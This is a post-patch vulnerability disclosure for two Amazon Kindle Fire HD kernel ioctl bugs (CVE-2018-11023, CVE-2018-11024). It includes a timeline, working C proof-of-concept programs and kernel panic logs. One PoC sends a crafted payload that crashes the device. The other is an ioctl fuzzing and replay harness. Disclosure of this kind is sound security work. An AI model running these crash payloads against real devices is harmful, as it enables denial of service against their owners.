
# CVE-2018-11023 & CVE-2018-11024
These page show the practical CVEs that Found. I reported these bugs to Security@amazon.com on On 5/11/2018 and now I have been told they have repaired the bugs and the details can be published. However,  Amazon does not have an advisory page at the moment. I think it is a must to list the detailed infomation here.
## Time Line
 * 5/11/2018 Bugs were reported to Security@amazon.com.
 * 06/27/2018 Amazon got confirmation that two of them allow local elevation of privilege from a regular user to root (CVE-2018-11023 and CVE-2018-11024 on /dev/gcioctl). 
 * 09/18/2018 Amazon had started updating our FireOS 4 devices with the security patches addressing the two critical issues (i.e. CVE-2018-11023 and CVE-2018-11024 on /dev/gcioctl).
 

 ## CVE-2018-11023
 ### Abstract
 
* Name: Amazon Kindle Fire HD (3rd Generation) Kernel DoS
* Date: 2018-10-10
* Reporter: Shuaibing Lu, Liang Ming
* Vendor: http://www.amazon.com/
* Software Link: https://fireos-tablet-src.s3.amazonaws.com/46sVcHzumgrjpCXPHw6oygKVmw/kindle_fire_7inch_4.5.5.3.tar.bz2
* Version: Fire OS 4.5.5.3
### Description

Kernel module /omap/drivers/misc/gcx/gcioctl/gcif.c in the kernel component in Amazon Kindle Fire HD(3rd) Fire OS 4.5.5.3 allows attackers to inject a crafted argument via the argument of an ioctl on device /dev/gcioctl with the command 3222560159 and cause a kernel crash.

### PoC
```
/*
 * This is poc of Kindle Fire HD 3rd
 * A bug in the ioctl interface of device file /dev/gcioctl causes the system crash via IOCTL 3222560159. 
 * This Poc should run with permission to do ioctl on /dev/gcioctl.
 *
 */
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>

const static char *driver = "/dev/gcioctl";
static command = 3222560159; 

int main(int argc, char **argv, char **env) {
        unsigned int payload[] = { 0x244085aa, 0x1a03e6ef, 0x000003f4, 0x00000000 };

        int fd = 0;
        
        fd = open(driver, O_RDONLY);
        if (fd < 0) {
            printf("Failed to open %s, with errno %d\n", driver, errno);
            system("echo 1 > /data/local/tmp/log");
            return -1;
        }
        
        printf("Try open %s with command 0x%x.\n", driver, command);
        printf("System will crash and reboot.\n");
        if(ioctl(fd, command, &payload) < 0) {
            printf("Allocation of structs failed, %d\n", errno);
            system("echo 2 > /data/local/tmp/log");
            return -1;
        }
        close(fd);
        return 0;
}
```
### References

MITRE Orgnazation: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11023

Kindle Kernel Sources:https://www.amazon.com/gp/help/customer/display.html?nodeId=200203720 

Kindle kernel (version 4.5.5.3 for kindle fire hdx 3rd): 

### Crash Log

```
[   79.825592] init: untracked pid 3232 exited
[   79.830841] init: untracked pid 3234 exited
[   95.970855] Alignment trap: not handling instruction e1953f9f at [<c06a4d84>]
[   95.978912] Unhandled fault: alignment exception (0x001) at 0x1a03e6f3
[   95.986053] Internal error: : 1 [#1] PREEMPT SMP ARM
[   95.991638] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)
[   95.999145] CPU: 0    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)
[   96.006408] PC is at __raw_spin_lock_irqsave+0x38/0xb0
[   96.012115] LR is at _raw_spin_lock_irqsave+0x10/0x14
[   96.017791] pc : [<c06a4d88>]    lr : [<c06a4e10>]    psr: 20000093
[   96.017822] sp : d02bfdd8  ip : d02bfdf8  fp : d02bfdf4
[   96.030578] r10: 00000000  r9 : dd3eeca8  r8 : 00000001
[   96.036376] r7 : 1a03e6ef  r6 : 00000001  r5 : 1a03e6f3  r4 : d02be000
[   96.043701] r3 : 00000001  r2 : 00000001  r1 : 00000082  r0 : 20000013
[   96.050933] Flags: nzCv  IRQs off  FIQs on  Mode SVC_32  ISA ARM  Segment user
[   96.058990] Control: 10c5387d  Table: 96cb804a  DAC: 00000015
[   96.065460] 
[   96.065460] PC: 0xc06a4d08:
[   96.070404] 4d08  1a000003 eaffffe6 e5903000 e3530000 0affffe3 e5903004 e3530000 1afffff9
[   96.080810] 4d28  eaffffdf e50b0018 ebfffbab e51b0018 eaffffed e1a0c00d e92dd800 e24cb004
[   96.091217] 4d48  ebffffcf e89da800 e1a0c00d e92dd878 e24cb004 e1a0300d e3c34d7f e3c4403f
[   96.101776] 4d68  e1a05000 e3a06001 e5943004 e2833001 e5843004 e10f0000 f10c0080 e1953f9f
[   96.112335] 4d88  e3330000 01853f96 e3530000 0a000014 e121f000 e5943004 e2433001 e5843004
[   96.122894] 4da8  e5943000 e3130002 1a000010 e5953004 e3530000 e5953000 05856004 e3530000
[   96.133361] 4dc8  1a000003 eaffffe7 e5953000 e3530000 0affffe4 e5953004 e3530000 1afffff9
[   96.143920] 4de8  eaffffe0 f57ff05f e5853004 e89da878 ebfffb79 eaffffec e1a0c00d e92dd800
[   96.154479] 
[   96.154479] LR: 0xc06a4d90:
[   96.159393] 4d90  e3530000 0a000014 e121f000 e5943004 e2433001 e5843004 e5943000 e3130002
[   96.170013] 4db0  1a000010 e5953004 e3530000 e5953000 05856004 e3530000 1a000003 eaffffe7
[   96.180603] 4dd0  e5953000 e3530000 0affffe4 e5953004 e3530000 1afffff9 eaffffe0 f57ff05f
[   96.191070] 4df0  e5853004 e89da878 ebfffb79 eaffffec e1a0c00d e92dd800 e24cb004 ebffffcf
[   96.201690] 4e10  e89da800 e1a0c00d e92dd800 e24cb004 ebfffff6 e89da800 e1a0c00d e92dd800
[   96.212341] 4e30  e24cb004 ebfffff1 e89da800 e1a0c00d e92dd818 e24cb004 ebffffc0 e1a04000
[   96.222808] 4e50  ebe6a978 e121f004 e89da818 e1a0c00d e92dd800 e24cb004 ebfffff3 e89da800
[   96.233612] 4e70  e1a0c00d e92dd830 e24cb004 e24dd008 e1a0300d e3c34d7f e3c4403f e3a05001
[   96.244262] 
[   96.244262] SP: 0xd02bfd58:
[   96.249145] fd58  00000000 0000001d 00000004 d4736f80 d4737394 c06a4d84 20000093 ffffffff
[   96.259948] fd78  d02bfdc4 00000001 d02bfdf4 d02bfd90 c06a5318 c0008370 20000013 00000082
[   96.270660] fd98  00000001 00000001 d02be000 1a03e6f3 00000001 1a03e6ef 00000001 dd3eeca8
[   96.281311] fdb8  00000000 d02bfdf4 d02bfdf8 d02bfdd8 c06a4e10 c06a4d88 20000093 ffffffff
[   96.292053] fdd8  0000020a 00000082 1a03e6f3 d02be000 d02bfe04 d02bfdf8 c06a4e10 c06a4d5c
[   96.302825] fdf8  d02bfe14 d02bfe08 c06a4e24 c06a4e0c d02bfe5c d02bfe18 c06a3008 c06a4e20
[   96.313415] fe18  d84a38d8 d84a2800 d84a3800 0000000a d02be000 c33a3180 d02bfe54 1a03e6ef
[   96.323883] fe38  bed24608 d02be000 d627f000 bed24608 dd3eeca8 00000000 d02bfe6c d02bfe60
[   96.334533] 
[   96.334533] IP: 0xd02bfd78:
[   96.339416] fd78  d02bfdc4 00000001 d02bfdf4 d02bfd90 c06a5318 c0008370 20000013 00000082
[   96.349853] fd98  00000001 00000001 d02be000 1a03e6f3 00000001 1a03e6ef 00000001 dd3eeca8
[   96.360290] fdb8  00000000 d02bfdf4 d02bfdf8 d02bfdd8 c06a4e10 c06a4d88 20000093 ffffffff
[   96.370727] fdd8  0000020a 00000082 1a03e6f3 d02be000 d02bfe04 d02bfdf8 c06a4e10 c06a4d5c
[   96.381042] fdf8  d02bfe14 d02bfe08 c06a4e24 c06a4e0c d02bfe5c d02bfe18 c06a3008 c06a4e20
[   96.391479] fe18  d84a38d8 d84a2800 d84a3800 0000000a d02be000 c33a3180 d02bfe54 1a03e6ef
[   96.402008] fe38  bed24608 d02be000 d627f000 bed24608 dd3eeca8 00000000 d02bfe6c d02bfe60
[   96.412445] fe58  c06a319c c06a2fec d02bff04 d02bfe70 c0317c28 c06a3194 00000001 00000028
[   96.422790] 
[   96.422790] FP: 0xd02bfd74:
[   96.427795] fd74  ffffffff d02bfdc4 00000001 d02bfdf4 d02bfd90 c06a5318 c0008370 20000013
[   96.438140] fd94  00000082 00000001 00000001 d02be000 1a03e6f3 00000001 1a03e6ef 00000001
[   96.448699] fdb4  dd3eeca8 00000000 d02bfdf4 d02bfdf8 d02bfdd8 c06a4e10 c06a4d88 20000093
[   96.459289] fdd4  ffffffff 0000020a 00000082 1a03e6f3 d02be000 d02bfe04 d02bfdf8 c06a4e10
[   96.470031] fdf4  c06a4d5c d02bfe14 d02bfe08 c06a4e24 c06a4e0c d02bfe5c d02bfe18 c06a3008
[   96.480438] fe14  c06a4e20 d84a38d8 d84a2800 d84a3800 0000000a d02be000 c33a3180 d02bfe54
[   96.490875] fe34  1a03e6ef bed24608 d02be000 d627f000 bed24608 dd3eeca8 00000000 d02bfe6c
[   96.501495] fe54  d02bfe60 c06a319c c06a2fec d02bff04 d02bfe70 c0317c28 c06a3194 00000001
[   96.512023] 
[   96.512023] R4: 0xd02bdf80:
[   96.517089] df80  000003ef 61ef22a8 61ef2278 61ef22d8 00000036 c0013e08 00000000 d02bdfa8
[   96.527679] dfa0  c0013c60 c0136578 61ef22a8 61ef2278 0000000a c0186201 65490ce8 65490ce0
[   96.538208] dfc0  61ef22a8 61ef2278 61ef22d8 00000036 00000001 65393000 6253ab8c 4010f2ec
[   96.548797] dfe0  00000001 65490cd0 400f0273 400e3804 600f0010 0000000a 5788f1b0 0000000b
[   96.559356] e000  00000002 00000003 00000000 d4736f80 c0a0e840 00000000 00000015 c4fcf880
[   96.569885] e020  00000000 d02be000 c09ddc50 d4736f80 dd0be600 c1617b40 d02bfdf4 d02bfd40
[   96.580535] e040  c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000
[   96.591125] e060  005bc4c0 5ebfea7f 00000000 00000000 00000000 00000000 00000000 00000000
[   96.601684] 
[   96.601684] R9: 0xdd3eec28:
[   96.606628] ec28  dd3eec28 dd3eec28 00000000 00000000 00000000 c06bc674 000200da c09dda58
[   96.617218] ec48  00000000 00000000 dd3eec50 dd3eec50 00000000 c0aa5174 c0aa5174 c0aa5148
[   96.627716] ec68  5aefd4d7 00000000 00000000 00000000 dd3eec80 00000000 00000000 00000000
[   96.638275] ec88  00200000 00000000 00000000 dd3eec94 dd3eec94 dd3d6fc0 dd3d6fc0 00000000
[   96.648864] eca8  000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd150400
[   96.659423] ecc8  dd3eed80 dd33ae70 00001064 00000001 0fb00000 5aefd4d7 2d2b4d15 5aefd4d7
[   96.669921] ece8  2d2b4d15 5aefd4d7 2d2b4d15 00000000 00000000 00000000 00000000 00000000
[   96.680572] ed08  00000000 00000000 00000000 00000000 00000001 00000000 00000000 dd3eed24
[   96.691162] Process gcioctl_poc_3 (pid: 3395, stack limit = 0xd02be2f8)
[   96.698455] Stack: (0xd02bfdd8 to 0xd02c0000)
[   96.703430] fdc0:                                                       0000020a 00000082
[   96.712554] fde0: 1a03e6f3 d02be000 d02bfe04 d02bfdf8 c06a4e10 c06a4d5c d02bfe14 d02bfe08
[   96.721588] fe00: c06a4e24 c06a4e0c d02bfe5c d02bfe18 c06a3008 c06a4e20 d84a38d8 d84a2800
[   96.730743] fe20: d84a3800 0000000a d02be000 c33a3180 d02bfe54 1a03e6ef bed24608 d02be000
[   96.739837] fe40: d627f000 bed24608 dd3eeca8 00000000 d02bfe6c d02bfe60 c06a319c c06a2fec
[   96.748840] fe60: d02bff04 d02bfe70 c0317c28 c06a3194 00000001 00000028 000fffff d02bfea0
[   96.757934] fe80: d02bfedc d02bfe90 c0207454 c00bd920 0000001e c33a3180 d02bfed4 d02bfea8
[   96.767059] fea0: 244085aa 1a03e6ef 000003f4 00000000 00000000 00000001 00000000 d02bff14
[   96.776214] fec0: 00000000 00000001 dd3eeca8 c24d8a00 d02bfefc d02bfee0 c02089fc 00000000
[   96.785247] fee0: d627f000 00000004 d627f000 bed24608 dd3eeca8 00000000 d02bff74 d02bff08
[   96.794403] ff00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190
[   96.803649] ff20: dcf8c770 d02bff0c d02be000 bed24638 bed24608 c0145d9f d627f000 00000004
[   96.812744] ff40: d02be000 00000000 d02bff64 00000000 bed24608 c0145d9f d627f000 00000004
[   96.821746] ff60: d02be000 00000000 d02bffa4 d02bff78 c01365e0 c0135fc4 00000000 00000000
[   96.830932] ff80: 00000400 bed24638 00010e54 00000000 00000036 c0013e08 00000000 d02bffa8
[   96.840118] ffa0: c0013c60 c0136578 bed24638 00010e54 00000004 c0145d9f bed24608 bed24608
[   96.849121] ffc0: bed24638 00010e54 00000000 00000036 00000000 00000000 00000000 bed24624
[   96.858245] ffe0: 00000000 bed245ec 00010690 0002917c 60000010 00000004 006f0063 002e006d
[   96.867340] Backtrace: 
[   96.870330] [<c06a4d50>] (__raw_spin_lock_irqsave+0x0/0xb0) from [<c06a4e10>] (_raw_spin_lock_irqsave+0x10/0x14)
[   96.881591]  r6:d02be000 r5:1a03e6f3 r4:00000082 r3:0000020a
[   96.888488] [<c06a4e00>] (_raw_spin_lock_irqsave+0x0/0x14) from [<c06a4e24>] (_raw_spin_lock_irq+0x10/0x14)
[   96.899291] [<c06a4e14>] (_raw_spin_lock_irq+0x0/0x14) from [<c06a3008>] (wait_for_common+0x28/0x150)
[   96.909729] [<c06a2fe0>] (wait_for_common+0x0/0x150) from [<c06a319c>] (wait_for_completion_interruptible_timeout+0x14/0x18)
[   96.922149] [<c06a3188>] (wait_for_completion_interruptible_timeout+0x0/0x18) from [<c0317c28>] (dev_ioctl+0x7ec/0x10c4)
[   96.934204] [<c031743c>] (dev_ioctl+0x0/0x10c4) from [<c0136044>] (do_vfs_ioctl+0x8c/0x5b4)
[   96.943481] [<c0135fb8>] (do_vfs_ioctl+0x0/0x5b4) from [<c01365e0>] (sys_ioctl+0x74/0x84)
[   96.952636] [<c013656c>] (sys_ioctl+0x0/0x84) from [<c0013c60>] (ret_fast_syscall+0x0/0x30)
[   96.961822]  r8:c0013e08 r7:00000036 r6:00000000 r5:00010e54 r4:bed24638
[   96.970153] Code: e5843004 e10f0000 f10c0080 e1953f9f (e3330000) 
[   96.977264] Board Information: 
[   96.977264]  Revision : 0001
[   96.977294]  Serial	: 0000000000000000
[   96.977294] SoC Information:
[   96.977294]  CPU	: OMAP4470
[   96.977294]  Rev	: ES1.0
[   96.977325]  Type	: HS
[   96.977325]  Production ID: 0002B975-000000CC
[   96.977325]  Die ID	: 1CC60000-50002FFF-0B00935D-11007004
[   96.977355] 
[   97.013824] ---[ end trace 2432291f2b5d99ba ]---
[   97.019195] Kernel panic - not syncing: Fatal exception
[   97.025024] CPU1: stopping
[   97.028137] Backtrace: 
[   97.031311] [<c0018148>] (dump_backtrace+0x0/0x10c) from [<c0698bb8>] (dump_stack+0x18/0x1c)
[   97.040679]  r6:c09ddc50 r5:c09dc844 r4:00000001 r3:c0a0e950
[   97.047668] [<c0698ba0>] (dump_stack+0x0/0x1c) from [<c0019bd8>] (handle_IPI+0x190/0x1c4)
[   97.056884] [<c0019a48>] (handle_IPI+0x0/0x1c4) from [<c00084fc>] (gic_handle_irq+0x58/0x60)
[   97.066253] [<c00084a4>] (gic_handle_irq+0x0/0x60) from [<c06a5380>] (__irq_svc+0x40/0x70)
[   97.075561] Exception stack(0xd6cb7d28 to 0xd6cb7d70)
[   97.081237] 7d20:                   c1620b40 c3152ac0 d799dc70 00000000 00000000 c1620b40
[   97.090454] 7d40: d6cb6000 c4eaaf80 00000001 c4eaaf80 c1620b40 d6cb7d7c d6cb7d80 d6cb7d70
[   97.099670] 7d60: c0074004 c06a4880 60070013 ffffffff
[   97.105346]  r6:ffffffff r5:60070013 r4:c06a4880 r3:c0074004
[   97.112487] [<c06a485c>] (_raw_spin_unlock_irq+0x0/0x50) from [<c0074004>] (finish_task_switch+0x58/0x12c)
[   97.123321] [<c0073fac>] (finish_task_switch+0x0/0x12c) from [<c06a36fc>] (__schedule+0x3ec/0x830)
[   97.133239]  r8:c3152ac0 r7:c09ddc50 r6:d6cb6000 r5:c09b6b40 r4:c4fcf340
[   97.141143] r3:00000001
[   97.144500] [<c06a3310>] (__schedule+0x0/0x830) from [<c06a3c24>] (preempt_schedule+0x40/0x5c)
[   97.154174] [<c06a3be4>] (preempt_schedule+0x0/0x5c) from [<c06a4808>] (_raw_spin_unlock+0x48/0x4c)
[   97.164337]  r4:c0a7375c r3:00000002
[   97.168731] [<c06a47c0>] (_raw_spin_unlock+0x0/0x4c) from [<c00983d0>] (futex_wake+0xfc/0x130)
[   97.178436] [<c00982d4>] (futex_wake+0x0/0x130) from [<c0099868>] (do_futex+0xf8/0x9e8)
[   97.187469] [<c0099770>] (do_futex+0x0/0x9e8) from [<c009a1ec>] (sys_futex+0x94/0x178)
[   97.196289] [<c009a158>] (sys_futex+0x0/0x178) from [<c0013c60>] (ret_fast_syscall+0x0/0x30)
[   97.205871] CPU0 PC (0) : 0xc003ee38
[   97.209930] CPU0 PC (1) : 0xc003ee54
[   97.214111] CPU0 PC (2) : 0xc003ee54
[   97.218170] CPU0 PC (3) : 0xc003ee54
[   97.222229] CPU0 PC (4) : 0xc003ee54
[   97.226409] CPU0 PC (5) : 0xc003ee54
[   97.230468] CPU0 PC (6) : 0xc003ee54
[   97.234527] CPU0 PC (7) : 0xc003ee54
[   97.238739] CPU0 PC (8) : 0xc003ee54
[   97.242767] CPU0 PC (9) : 0xc003ee54
[   97.246826] CPU1 PC (0) : 0xc0019b2c
[   97.251007] CPU1 PC (1) : 0xc0019b2c
[   97.255065] CPU1 PC (2) : 0xc0019b2c
[   97.259124] CPU1 PC (3) : 0xc0019b2c
[   97.263183] CPU1 PC (4) : 0xc0019b2c
[   97.267364] CPU1 PC (5) : 0xc0019b2c
[   97.271423] CPU1 PC (6) : 0xc0019b2c
[   97.275482] CPU1 PC (7) : 0xc0019b2c
[   97.279693] CPU1 PC (8) : 0xc0019b2c
[   97.283752] CPU1 PC (9) : 0xc0019b2c
[   97.287811] 
[   97.289581] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017
[   97.289611] 

```


 ## CVE-2018-11024
 ### Abstract
 
* Name: Amazon Kindle Fire HD (3rd Generation) Kernel DoS
* Date: 2018-10-10
* Reporter: Shuaibing Lu, Liang Ming
* Vendor: http://www.amazon.com/
* Software Link: https://fireos-tablet-src.s3.amazonaws.com/46sVcHzumgrjpCXPHw6oygKVmw/kindle_fire_7inch_4.5.5.3.tar.bz2
* Version: Fire OS 4.5.5.3
### Description
Kernel module /omap/drivers/misc/gcx/gcioctl/gcif.c in the kernel component in Amazon Kindle Fire HD(3rd) Fire OS 4.5.5.3 allows attackers to inject a crafted argument via the argument of an ioctl on device /dev/gcioctl with the command 1077435789 and cause a kernel crash.

### PoC
```
#include<stdio.h>
#include<string.h>	  //strlen
#include<sys/socket.h>
#include<arpa/inet.h> //inet_addr
#include<unistd.h>	  //write
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdbool.h>

// Socket boilerplate code taken from here: http://www.binarytides.com/server-client-example-c-sockets-linux/

/*
 seed, ioctl_id, num_mappings, num_blobs, dev_name_len, dev_name, map_entry_t_arr, blobs
*/
int debug = 1;

typedef struct {
	int src_id;
	int dst_id;
	int offset;
} map_entry_t;

short tiny_vals[18] = {128, 127, 64, 63, 32, 31, 16, 15, 8, 7, 4, 3, 2, 1, 0, 256, 255, -1};
int *small_vals;
int num_small_vals;

// populates small_vals when called
void populate_arrs(int top) {
	int num = 1;
	int count = 0;
	while (num < top) {
		//printf("%d\n", num);
		num <<= 1;
		count += 2;
	}
	// top
	count += 1;
	// -1
	count += 1;
	num_small_vals = count;
	num >>= 1;

	small_vals = malloc(sizeof(int)*count);
	memset(small_vals, 0, count);

	int i = 0;
	while(num > 1) {
		small_vals[i] = num;
		i++;
		small_vals[i] = num-1;
		i++;
		num >>= 1;
	}
	small_vals[i] = 0;
	small_vals[i+1] = top;
	small_vals[i+2] = top-1;
	small_vals[i+3] = -1;
}

// generate a random value of size size and store it in elem.
// value has a weight % chance to be a "small value"
void gen_rand_val(int size, char *elem,  int small_weight) {
	int i;

	if ((rand() % 100) < small_weight) {
		// do small thing
		unsigned int idx = (rand() % num_small_vals);
		printf("Choosing %d\n", small_vals[idx]);
		switch (size) {
			case 2:
				idx = (rand() % 18);
				*(short *)elem = tiny_vals[idx];
				break;
			case 4:
				*(int *)elem = small_vals[idx];
				break;

			case 8:
				*(long long*)elem = small_vals[idx];
				break;

			default:
				printf("Damn bro. Size: %d\n", size);
				exit(-1);
		}
	}

	else {

		for(i=0; i < size; i++) {
			elem[i] = (char)(rand()%0x100);
		}
	}

}
 
int main(int argc , char *argv[])
{
	int num_blobs = 0, num_mappings = 0, i = 0, dev_name_len = 0, j;
	unsigned int ioctl_id = 0;
	char *dev_name;
	void *tmp;
	char **ptr_arr;
	int *len_arr;
	unsigned int seed;

	int sockfd , client_sock , c , read_size;
	struct sockaddr_in server , client;
	int msg_size;
	void *generic_arr[264];

	// max val for small_vals array
	int top = 8192;
	int cnt = 0;
	// chance that our generics are filled with "small vals"
	int default_weight = 50;
	populate_arrs(top);
	int retest = 1;
	goto rerun;
	


	sockfd = socket(AF_INET , SOCK_STREAM , 0);
	if (sockfd == -1)
	{
		printf("Could not create socket");
	}
	puts("Socket created");

	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int));
	 
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = INADDR_ANY;
	server.sin_port = htons(atoi(argv[1]));

	//Bind
	if( bind(sockfd,(struct sockaddr *)&server , sizeof(server)) < 0)
	{
		//print the error message
		perror("bind failed. Error");
		return 1;
	}
	puts("bind done");
listen:	 
	// Listen
	listen(sockfd , 3);
	 
	puts("Waiting for incoming connections...");
	c = sizeof(struct sockaddr_in);
	 
	// accept connection from an incoming client
	client_sock = accept(sockfd, (struct sockaddr *)&client, (socklen_t*)&c);
	if (client_sock < 0)
	{
		perror("accept failed");
		return 1;
	}
	puts("Connection accepted");
	 
	msg_size = 0;
	// Receive a message from client
	while( (read_size = recv(client_sock , &msg_size , 4 , 0)) > 0 )
	{
		// recv the entire message
		char *recv_buf = calloc(msg_size, sizeof(char));
		if (recv_buf == NULL) {
			printf("Failed to allocate recv_buf\n");
			exit(-1);
		}

		int nrecvd = recv(client_sock, recv_buf, msg_size, 0);
		if (nrecvd != msg_size) {
			printf("Error getting all data!\n");
			printf("nrecvd: %d\nmsg_size:%d\n", nrecvd, msg_size);
			exit(-1);
		}
		// quickly save a copy of the most recent data
		int savefd = open("/sdcard/saved", O_WRONLY|O_TRUNC|O_CREAT, 0644);
		if (savefd < 0) {
			perror("open saved");
			exit(-1);
		}

		int err = write(savefd, recv_buf, msg_size);
		if (err != msg_size) {
			perror("write saved");
			exit(-1);
		}
		fsync(savefd);
		close(savefd);
rerun:
		if (retest) {
			recv_buf = calloc(msg_size, sizeof(char));
			int fd = open("/sdcard/saved", O_RDONLY);
			if (fd < 0) {
				perror("open:");
				exit(-1);
			}
			int fsize = lseek(fd, 0, SEEK_END);
			printf("file size: %d\n", fsize);
			lseek(fd, 0, SEEK_SET);
			read(fd, recv_buf, fsize);
		}

		char *head = recv_buf;
		seed = 0;
		//seed, ioctl_id, num_mappings, num_blobs, dev_name_len, dev_name, map_entry_t_arr, blob_len_arr, blobs
		memcpy(&seed, head, 4);
		head += 4;
		memcpy(&ioctl_id, head, 4);
		head += 4;
		memcpy(&num_mappings, head, 4);
		head += 4;
		memcpy(&num_blobs, head, 4);
		head += 4;
		memcpy(&dev_name_len, head, 4);
		head += 4;
		
		// srand with new seed
		srand(seed);

		/* dev name */
		dev_name = calloc(dev_name_len+1, sizeof(char));
		if (dev_name == NULL) {
			printf("Failed to allocate dev_name\n");
			exit(-1);
		}
		memcpy(dev_name, head, dev_name_len);
		head += dev_name_len;

		/* map */
		map_entry_t *map = calloc(num_mappings, sizeof(map_entry_t));
		if (map == NULL) {
			printf("Failed to allocate map\n");
			exit(-1);
		}

		if (num_mappings != 0) {
			memcpy(map, head, num_mappings*sizeof(map_entry_t));
			head += num_mappings*sizeof(map_entry_t);
		}

		/* blobs */
		
		// first create an array to store the sizes themselves
		len_arr = calloc(num_blobs, sizeof(int));
		if (len_arr == NULL) {
			printf("Failed to allocate len_arr\n");
			exit(-1);
		}

		// we'll also want an array to store our pointers
		ptr_arr = calloc(num_blobs, sizeof(void *));
		if (ptr_arr == NULL) {
			printf("Failed to allocate ptr_arr\n");
			exit(-1);
		}


		// copy the blob sizes into our size_arr
		for (j=0; j < num_blobs; j++) {
			memcpy(&len_arr[j], head, sizeof(int));
			head += sizeof(int);
		}

		// we'll also want memory bufs for all blobs
		// now that we have the sizes, allocate all the buffers we need
		for (j=0; j < num_blobs; j++) {
			ptr_arr[j] = calloc(len_arr[j], sizeof(char));
            printf("Sizeof(ptr_arr[%d])=%d\n", j, len_arr[j]);
            printf("ptr_arr[%d]=%p\n", j, ptr_arr[j]);

			//printf("just added %p to ptr_arr\n", ptr_arr[j]);
			if (ptr_arr[j] == NULL) {
				printf("Failed to allocate a blob store\n");
				exit(-1);
			}

			// might as well copy the memory over as soon as we allocate the space
			memcpy((char *)ptr_arr[j], head, len_arr[j]);
            printf("ptr_arr[%d]=\n", j);
            for(i=0;i<len_arr[j];i+=4){
                printf("0x%08x\n", *(unsigned int *)(ptr_arr[j] + i));
            }
            printf("\n");

			head += len_arr[j];
		}
		
		int num_generics = 0;

		// time for pointer fixup
		for (i=0; i < num_mappings; i++) {
			// get out entry
			map_entry_t entry = map[i];
			// pull out the struct to be fixed up
			char *tmp = ptr_arr[entry.src_id];
		
			// check if this is a struct ptr or just a generic one
			
			// just a generic one
			if (entry.dst_id < 0) {
				// 90% chance we fixup the generic
				if ( (rand() % 10) > 0) {
					int buf_len = 128;
					char *tmp_generic = malloc(buf_len);
					memset(tmp_generic, 0, buf_len);
					// 95% chance we fill it with data
					if ((rand() % 100) > 95) {
						// if dst_id is < 0, it's abs value is the element size
						int size = -1 * entry.dst_id;
						int weight;
						// if it's a char or some float, never choose a "small val"
						if (size == 1 || size > 8)
							weight = 0;
						else
							weight = default_weight;

						for (i=0; i < buf_len; i+=size) {
							gen_rand_val(size, &tmp_generic[i], weight);
						}
					}
					generic_arr[num_generics] = tmp_generic;
					memcpy(tmp+entry.offset, &tmp_generic, sizeof(void *));
					num_generics += 1;
					if (num_generics >= 264) {
						printf("Code a better solution for storing generics\n");
						exit(1);
					}
				}
			}

			// a struct ptr, so we have the data
			else {
				// 1 in 400 chance we don't fixup
				if ( (rand() % 400) > 0) {
					// now point it to the correct struct/blob
					// printf("placing %p, at %p\n", ptr_arr[entry.dst_id], tmp+entry.offset);
					memcpy(tmp+entry.offset, &ptr_arr[entry.dst_id], sizeof(void *));
				}
			}
		}
		
		if (debug) {
			printf("ioctl_id: %d\n", ioctl_id);
			printf("num_mappings: %d\n", num_mappings);
			printf("num_blobs: %d\n", num_blobs);
			printf("dev_name_len: %d\n", dev_name_len);
			printf("dev_name: %s\n", dev_name);
			printf("data[]: \n");
            //printf("(0x%x)\n", *(int *)&ptr_arr[0]);
            printf("(0x%p) : ", &ptr_arr[0]);
            printf("(0x%016lx)\n", *(unsigned long int *)ptr_arr[0]);
            printf("(0x%p) : ", (&ptr_arr[0]+1*8));
            printf("(0x%016lx)\n", *(unsigned long int *)(ptr_arr[0]+1*8));

            printf("(0x%p) : ", (&ptr_arr[0]+2*8));
            printf("(0x%016lx)\n", *(unsigned long int *)(ptr_arr[0]+2*8));

            printf("(0x%p) : ", (&ptr_arr[0]+3*8));
            printf("(0x%016lx)\n", *(unsigned long int *)(ptr_arr[0]+3*8));

            printf("(0x%p) : ", (&ptr_arr[0]+4*8));
            printf("(0x%016lx)\n", *(unsigned long int *)(ptr_arr[0]+4*8));

            //printf("(0x%016lx)\n", *(unsigned long int *)(ptr_arr[0]+5*8));
            //printf("(0x%016lx)\n", *(unsigned long int *)(ptr_arr[0]+6*8));

            //printf("(0x%x)\n", (int *)ptr_arr, (int *)ptr_arr);
            
		}
		
		// time for the actual ioctl
		//printf("Try to open device %s\n", dev_name);
		//fflush(stdout);
		int fd = open(dev_name, O_RDONLY);
		if (fd < 0) {
			perror("open");
			exit(-1);
		} else {
		    printf("Open devicd %s successfully.\n", dev_name);
		}

		//fflush(stdout);
		//printf("Try to call ioctl(fd=%d, ioctl_id=%d, ptr_arr=%p)\n", fd, ioctl_id, ptr_arr[0]);
		fflush(stdout);
		printf("%10d:", cnt++);
		if ((ioctl(fd, ioctl_id, ptr_arr[0])) == -1)
			perror("ioctl");
		
		else
			printf("good hit\n");
		close(fd);
		printf("device %s closed\n", dev_name);

		if (retest)
			exit(0);

		fflush(stdout);
		// okay now free all the shit we alloced
		free(recv_buf);
		free(dev_name);
		if (map != NULL)
			free(map);
		free(len_arr);
		for (i=0; i < num_blobs; i++) {
			//printf("%d: free'ing %p\n", i, ptr_arr[i]);
			free(ptr_arr[i]);
		}
		free(ptr_arr);
		for (i=0; i < num_generics; i++) {
			free(generic_arr[i]);
		}
		
		write(client_sock, &msg_size, 4);

		msg_size = 0;
	}
	 
	if(read_size == 0)
	{
		puts("Client disconnected");
		fflush(stdout);
		close(client_sock);
		goto listen;
	}
	else if(read_size == -1)
	{
		perror("recv failed");
	}
	 
	return 0;
}
```
### References

MITRE Orgnazation: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11024

Kindle Kernel Sources:https://www.amazon.com/gp/help/customer/display.html?nodeId=200203720 

Kindle kernel (version 4.5.5.3 for kindle fire hdx 3rd): 

### Crash Log

```
[  144.428375] Unable to handle kernel paging request at virtual address d900000c
[  144.436462] pgd = dcac0000
